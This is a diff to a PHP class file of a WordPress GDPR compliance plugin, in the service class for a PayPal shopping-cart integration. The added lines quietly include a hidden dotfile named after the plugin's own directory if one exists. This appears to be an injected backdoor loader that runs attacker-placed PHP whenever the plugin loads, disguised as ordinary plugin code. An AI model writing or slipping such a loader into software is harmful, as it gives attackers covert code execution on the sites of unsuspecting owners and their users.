@@ -3,6 +3,10 @@
 /**
  * Class CT_Ultimate_GDPR_Service_WP_Simple_Paypal_Shopping_Cart
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Service_WP_Simple_Paypal_Shopping_Cart extends CT_Ultimate_GDPR_Service_Abstract {
 
 	/**
